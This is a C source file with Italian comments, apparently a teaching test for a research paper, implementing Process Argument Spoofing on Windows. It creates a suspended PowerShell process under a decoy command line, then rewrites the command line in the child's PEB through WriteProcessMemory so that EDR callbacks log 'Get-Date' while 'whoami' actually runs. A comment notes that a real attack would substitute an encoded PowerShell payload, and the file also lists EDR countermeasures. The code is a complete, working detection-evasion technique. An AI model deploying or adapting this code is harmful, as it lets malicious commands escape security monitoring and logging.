/*
 *
 * Programma di test - Argument Spoofing
 * =======================================
 *
 * SCOPO
 * =====
 * Questo programma dimostra la tecnica di Process Argument
 * Spoofing — manipola la command line che viene loggata
 * dalla callback dell'EDR sostituendola con un argomento
 * innocuo, mentre il processo esegue un argomento diverso.
 *
 * IMPORTANTE: questo è un test didattico con comandi innocui.
 * L'argomento falso è "Get-Date" (mostra la data corrente).
 * L'argomento reale è "whoami" (mostra l'utente corrente).
 * Entrambi sono comandi innocui — lo scopo è dimostrare
 * la discrepanza nella telemetria, non causare danno.
 *
 * COSA VEDE LA CALLBACK DELL'EDR
 * ================================
 * La callback PsSetCreateProcessNotifyRoutineEx vede:
 *
 *   CommandLine: powershell.exe -NoProfile -Command Get-Date  ← FALSO
 *
 * Quello che PowerShell esegue realmente:
 *
 *   powershell.exe -NoProfile -Command whoami                 ← REALE
 *
 * La discrepanza è invisibile alla callback perché la
 * modifica avviene DOPO che la callback ha già letto
 * la command line dal PEB del processo figlio.
 *
 * FLUSSO DI ESECUZIONE CON SPOOFING
 * ===================================
 *
 *   test_spoof_process.exe
 *       ↓
 *   CreateProcess("powershell.exe -NoProfile -Command Get-Date",
 *                 CREATE_SUSPENDED)
 *       ↓
 *   kernel crea il processo IN STATO SOSPESO
 *       ↓
 *   kernel chiama callback EDR  ← LEGGE LA COMMAND LINE FALSA
 *       CommandLine loggata: "powershell.exe -NoProfile -Command Get-Date"
 *       ↓
 *   processo padre legge PEB del figlio tramite NtQueryInformationProcess
 *       trova l'indirizzo di CommandLine nel PEB
 *       ↓
 *   processo padre sovrascrive CommandLine nel PEB del figlio
 *       con "powershell.exe -NoProfile -Command whoami"
 *       ↓
 *   ResumeThread - processo figlio inizia l'esecuzione
 *       legge PEB → trova la command line MODIFICATA
 *       esegue whoami (non Get-Date)
 *       ↓
 *   output: nome utente corrente
 *
 * PERCHÉ LA CALLBACK NON SE NE ACCORGE
 * ======================================
 * La callback viene chiamata dal kernel durante la creazione
 * del processo, prima che il processo inizi l'esecuzione.
 * In quel momento il PEB contiene ancora la command line
 * originale (falsa). La modifica avviene dopo la callback
 * ma prima del resume — la callback non viene ri-chiamata
 * quando il PEB viene modificato.
 *
 * Questo è un gap strutturale nel meccanismo della callback —
 * non è un bug ma una conseguenza del design: la callback
 * è pensata per essere notificata una volta al momento
 * della creazione, non monitorare continuamente il PEB.
 *
 * STRUTTURA DEL PEB (Process Environment Block)
 * ===============================================
 * Il PEB è una struttura in memoria userland che contiene
 * informazioni sul processo. È accessibile sia al processo
 * stesso che al processo padre tramite handle.
 *
 * La struttura rilevante per lo spoofing è:
 *
 *   PEB
 *     └── ProcessParameters (RTL_USER_PROCESS_PARAMETERS*)
 *             ├── CommandLine (UNICODE_STRING)
 *             │       ├── Length
 *             │       ├── MaximumLength
 *             │       └── Buffer  ← puntatore alla stringa
 *             └── ImagePathName (UNICODE_STRING)
 *
 * Per modificare la command line dobbiamo:
 * 1. Trovare l'indirizzo del PEB del processo figlio
 * 2. Leggere il puntatore a ProcessParameters
 * 3. Leggere il puntatore a CommandLine.Buffer
 * 4. Sovrascrivere il contenuto del Buffer con la stringa reale
 */

#include <windows.h>
#include <stdio.h>

/*
 * STRUTTURE NT NECESSARIE
 * ========================
 * Queste strutture non sono esposte negli header standard
 * di Windows — sono strutture interne del kernel/ntdll
 * documentate nel WDK e in progetti come phnt.
 */

/*
 * UNICODE_STRING
 * Struttura usata internamente da Windows per le stringhe.
 * Identica a quella usata in NtCreateFile — Windows usa
 * questa struttura in modo pervasivo in tutto il kernel
 * e nelle strutture di processo come il PEB.
 */
typedef struct _UNICODE_STRING {
    USHORT Length;          // lunghezza stringa in byte (senza terminatore)
    USHORT MaximumLength;   // dimensione totale del buffer
    PWSTR  Buffer;          // puntatore alla stringa UTF-16
} UNICODE_STRING, *PUNICODE_STRING;

/*
 * RTL_USER_PROCESS_PARAMETERS
 * Struttura che contiene i parametri del processo inclusa
 * la command line. È referenziata dal PEB.
 * Mostriamo solo i campi rilevanti — la struttura reale
 * è molto più grande ma i campi omessi non ci servono.
 */
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];   // campi interni non rilevanti
    PVOID          Reserved2[10];   // campi interni non rilevanti
    UNICODE_STRING ImagePathName;   // path dell'eseguibile
    UNICODE_STRING CommandLine;     // command line del processo ← ci interessa
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

/*
 * PEB (Process Environment Block)
 * Struttura principale che descrive il processo.
 * Accessibile tramite il registro GS:[0x60] in userland
 * o tramite NtQueryInformationProcess dal processo padre.
 * Mostriamo solo i campi che ci servono per lo spoofing.
 */
typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;  // flag debugger attached
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PVOID                         Ldr;            // lista moduli caricati
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters; // ← ci interessa
    // altri campi omessi per brevità
} PEB, *PPEB;

/*
 * PROCESS_BASIC_INFORMATION
 * Struttura restituita da NtQueryInformationProcess
 * con informazioni base sul processo incluso il PebBaseAddress —
 * l'indirizzo del PEB del processo nello spazio di memoria del figlio.
 */
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID  Reserved1;        // ExitStatus
    PPEB   PebBaseAddress;   // indirizzo del PEB ← ci interessa
    PVOID  Reserved2[2];     // AffinityMask, BasePriority
    ULONG_PTR UniqueProcessId;
    PVOID  Reserved3;        // InheritedFromUniqueProcessId
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

/*
 * Tipo per NtQueryInformationProcess
 * Funzione non documentata di ntdll che permette di leggere
 * informazioni interne su un processo incluso il PEB address.
 * Non è esposta negli header standard quindi la carichiamo
 * dinamicamente da ntdll tramite GetProcAddress.
 */
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD  ProcessInformationClass,
    PVOID  ProcessInformation,
    ULONG  ProcessInformationLength,
    PULONG ReturnLength
);


int main() {

    printf("=================================================\n");
    printf(" Test Argument Spoofing\n");
    printf(" Falso: Get-Date  |  Reale: whoami\n");
    printf("=================================================\n\n");

    /*
     * STEP 1 - CARICA NtQueryInformationProcess DA NTDLL
     * ====================================================
     * NtQueryInformationProcess non è nelle librerie standard
     * quindi la carichiamo dinamicamente.
     * La usiamo per ottenere l'indirizzo del PEB del processo figlio.
     */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(
            hNtdll, "NtQueryInformationProcess"
        );

    if (!NtQueryInformationProcess) {
        printf("[ERRORE] NtQueryInformationProcess non trovata\n");
        return 1;
    }

    printf("[OK] NtQueryInformationProcess caricata da ntdll\n");

    /*
     * STEP 2 - CREA IL PROCESSO SOSPESO CON ARGOMENTO FALSO
     * =======================================================
     * Questa è la differenza chiave rispetto alla versione normale.
     *
     * Passiamo a CreateProcess l'argomento FALSO "Get-Date" —
     * questo è quello che la callback dell'EDR vedrà e loggerà.
     *
     * CREATE_SUSPENDED è il flag critico — crea il processo
     * ma lo tiene sospeso prima di eseguire la prima istruzione.
     * In questo stato il PEB esiste e contiene la command line
     * ma il processo non ha ancora letto nulla dal PEB.
     * Questo ci dà la finestra temporale per modificare il PEB
     * DOPO che la callback ha già letto la command line falsa
     * e PRIMA che il processo inizi l'esecuzione.
     */
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Argomento FALSO - questo vede la callback dell'EDR
    char fakeCmdLine[] = "powershell.exe -NoProfile -Command Get-Date";

    printf("[*] Creazione processo SOSPESO con argomento falso:\n");
    printf("    Argomento falso (vede EDR): %s\n\n", fakeCmdLine);

    BOOL result = CreateProcessA(
        NULL,
        fakeCmdLine,        // argomento falso → visto dalla callback
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,   // SOSPESO - non esegue ancora
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!result) {
        printf("[ERRORE] CreateProcess fallita: %d\n", GetLastError());
        return 1;
    }

    printf("[OK] Processo creato in stato SOSPESO\n");
    printf("[INFO] PID processo figlio: %lu\n\n", pi.dwProcessId);

    printf("[*] Callback EDR ha già loggato:\n");
    printf("    CommandLine: %s\n\n", fakeCmdLine);

    /*
     * STEP 3 - TROVA L'INDIRIZZO DEL PEB DEL PROCESSO FIGLIO
     * =========================================================
     * NtQueryInformationProcess con ProcessBasicInformation (0)
     * restituisce la struttura PROCESS_BASIC_INFORMATION che
     * contiene PebBaseAddress — l'indirizzo del PEB del processo
     * figlio nel suo spazio di memoria.
     *
     * Questo indirizzo è nello spazio di memoria del FIGLIO —
     * non possiamo dereferenziarlo direttamente dal padre.
     * Dobbiamo usare ReadProcessMemory e WriteProcessMemory
     * per accedere alla memoria del figlio.
     */
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,            // handle al processo figlio
        0,                      // ProcessBasicInformation
        &pbi,                   // riceve la struttura
        sizeof(pbi),
        &returnLength
    );

    if (status != 0) {
        printf("[ERRORE] NtQueryInformationProcess: 0x%X\n", status);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[OK] PEB address del processo figlio: %p\n", pbi.PebBaseAddress);

    /*
     * STEP 4 - LEGGI IL PUNTATORE A ProcessParameters DAL PEB
     * ==========================================================
     * Il PEB del processo figlio è in memoria del figlio.
     * Usiamo ReadProcessMemory per leggere il campo
     * ProcessParameters dal PEB — è un puntatore a un'altra
     * struttura sempre in memoria del figlio.
     *
     * Dobbiamo fare questa lettura in due step perché
     * sia il PEB che ProcessParameters sono in memoria del figlio:
     *
     * Step A: leggi PEB dal figlio → ottieni puntatore a ProcessParameters
     * Step B: leggi ProcessParameters dal figlio → ottieni puntatori a CommandLine
     */

    // Step A - leggi ProcessParameters pointer dal PEB
    PVOID pProcessParameters = NULL;
    SIZE_T bytesRead = 0;

    // Il campo ProcessParameters è al offset corretto nella struttura PEB
    // Lo leggiamo usando l'offset del campo nella struttura
    ReadProcessMemory(
        pi.hProcess,
        // indirizzo del campo ProcessParameters nel PEB del figlio
        (PVOID)((BYTE*)pbi.PebBaseAddress +
            offsetof(PEB, ProcessParameters)),
        &pProcessParameters,    // riceve il puntatore
        sizeof(PVOID),
        &bytesRead
    );

    printf("[OK] ProcessParameters address: %p\n", pProcessParameters);

    /*
     * STEP 5 - LEGGI LA STRUTTURA UNICODE_STRING DI COMMANDLINE
     * ===========================================================
     * ProcessParameters contiene il campo CommandLine come
     * UNICODE_STRING — una struttura con Length, MaximumLength,
     * e Buffer (puntatore alla stringa effettiva).
     *
     * Dobbiamo leggere questa struttura per ottenere:
     * - l'indirizzo del Buffer (dove scrivere la stringa reale)
     * - MaximumLength (limite di quanto possiamo scrivere)
     */
    UNICODE_STRING commandLineStruct = {0};

    ReadProcessMemory(
        pi.hProcess,
        // indirizzo del campo CommandLine in ProcessParameters del figlio
        (PVOID)((BYTE*)pProcessParameters +
            offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine)),
        &commandLineStruct,     // riceve la struttura UNICODE_STRING
        sizeof(UNICODE_STRING),
        &bytesRead
    );

    printf("[OK] CommandLine.Buffer address: %p\n", commandLineStruct.Buffer);
    printf("[OK] CommandLine.MaximumLength: %d bytes\n\n",
        commandLineStruct.MaximumLength);

    /*
     * STEP 6 - SOVRASCRIVI LA COMMAND LINE NEL PEB DEL FIGLIO
     * =========================================================
     * Ora scriviamo la command line REALE nel Buffer del PEB del figlio.
     * Quando il processo riprenderà l'esecuzione, leggerà
     * questa stringa modificata invece di quella originale.
     *
     * La callback dell'EDR ha già letto la stringa falsa al momento
     * della creazione del processo — questa modifica non la
     * notifica perché è già stata chiamata.
     *
     * Questo è il gap strutturale: la callback è un evento
     * one-shot al momento della creazione, non un monitor
     * continuo del PEB.
     */

    // Argomento REALE - questo eseguirà PowerShell
    wchar_t realCmdLine[] = L"powershell.exe -NoProfile -Command whoami";

    // Calcola la dimensione in byte della stringa reale
    // wcslen restituisce il numero di caratteri wide (2 byte ciascuno)
    SIZE_T realCmdLineSize = (wcslen(realCmdLine) + 1) * sizeof(wchar_t);

    // Verifica che la stringa reale entri nel buffer esistente
    // Non possiamo espandere il buffer — dobbiamo stare dentro
    // MaximumLength che è la dimensione allocata originalmente
    if (realCmdLineSize > commandLineStruct.MaximumLength) {
        printf("[ERRORE] Stringa reale troppo lunga per il buffer del PEB\n");
        printf("         Massimo: %d byte, Richiesti: %zu byte\n",
            commandLineStruct.MaximumLength, realCmdLineSize);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[*] Sovrascrittura CommandLine nel PEB del processo figlio...\n");
    printf("    Indirizzo target: %p\n", commandLineStruct.Buffer);
    printf("    Nuova stringa: %ls\n\n", realCmdLine);

    // Scrivi la stringa reale nel Buffer del PEB del figlio
    BOOL writeResult = WriteProcessMemory(
        pi.hProcess,
        commandLineStruct.Buffer,   // indirizzo del Buffer nel figlio
        realCmdLine,                // stringa reale da scrivere
        realCmdLineSize,            // dimensione in byte
        &bytesRead
    );

    if (!writeResult) {
        printf("[ERRORE] WriteProcessMemory fallita: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    /*
     * STEP 7 - AGGIORNA IL CAMPO LENGTH DELLA UNICODE_STRING
     * =========================================================
     * La struttura UNICODE_STRING ha un campo Length che indica
     * la lunghezza attuale della stringa. Dobbiamo aggiornarlo
     * con la lunghezza della nuova stringa altrimenti
     * PowerShell potrebbe leggere solo una parte della command line.
     *
     * Length è in byte (non in caratteri) e non include
     * il terminatore null.
     */
    USHORT newLength = (USHORT)(wcslen(realCmdLine) * sizeof(wchar_t));

    WriteProcessMemory(
        pi.hProcess,
        // indirizzo del campo Length nella struttura CommandLine
        (PVOID)((BYTE*)pProcessParameters +
            offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine) +
            offsetof(UNICODE_STRING, Length)),
        &newLength,
        sizeof(USHORT),
        &bytesRead
    );

    printf("[OK] CommandLine nel PEB sovrascritta con successo\n\n");

    /*
     * STEP 8 - RIPRENDI L'ESECUZIONE DEL PROCESSO
     * ==============================================
     * ResumeThread sblocca il thread principale del processo figlio.
     * Il processo inizierà l'esecuzione leggendo il PEB modificato —
     * troverà la command line reale "whoami" e la eseguirà.
     *
     * La callback dell'EDR ha già loggato "Get-Date" —
     * non viene ri-chiamata al resume.
     * L'EDR vede un'esecuzione di Get-Date ma il processo
     * esegue whoami.
     */
    printf("[*] Resume del processo - esegue la command line REALE\n");
    printf("    EDR crede esegua: Get-Date\n");
    printf("    Esegue realmente: whoami\n\n");

    ResumeThread(pi.hThread);

    printf("[*] Output reale di PowerShell (whoami):\n");
    printf("--------------------\n");

    WaitForSingleObject(pi.hProcess, INFINITE);

    printf("--------------------\n\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /*
     * RIEPILOGO DEL TEST
     * ===================
     * Questo test dimostra che la callback dell'EDR
     * ha loggato "Get-Date" ma il processo ha eseguito "whoami".
     *
     * In un contesto malevolo reale:
     *   Argomento falso: "powershell.exe -NoProfile"      (innocuo)
     *   Argomento reale: "powershell.exe -enc <payload>"  (malevolo)
     *
     * La detection rule dell'EDR che cerca "-enc" nella
     * command line non scatterebbe perché ha loggato
     * l'argomento falso — esattamente il detection gap
     * analizzato nel paper.
     *
     * CONTROMISURE DEGLI EDR MODERNI
     * ================================
     * 1. Monitoraggio di WriteProcessMemory su processi
     *    in stato CREATE_SUSPENDED — segnale sospetto
     *
     * 2. Lettura della command line dal PEB dopo il resume
     *    per verificare discrepanze con quanto loggato
     *    al momento della creazione
     *
     * 3. Correlazione comportamentale — se il processo
     *    esegue operazioni incompatibili con la command
     *    line loggata, l'anomalia diventa rilevabile
     *
     * 4. ETW process start events — alcuni provider ETW
     *    loggano la command line al momento dell'esecuzione
     *    reale, non solo alla creazione — permettendo
     *    il confronto con quanto loggato dalla callback
     */
    printf("[RIEPILOGO]\n");
    printf("  Callback EDR ha loggato:  powershell.exe -NoProfile -Command Get-Date\n");
    printf("  PowerShell ha eseguito:   powershell.exe -NoProfile -Command whoami\n");
    printf("  Discrepanza rilevabile:   solo con contromisure avanzate\n\n");

    printf("[VERIFICA IN KIBANA]\n");
    printf("  Cerca: process.name: \"powershell.exe\"\n");
    printf("  La command line loggata dovrebbe mostrare Get-Date\n");
    printf("  ma l'output reale del processo è whoami\n\n");

    printf("Premi invio per terminare...\n");
    getchar();
    return 0;
}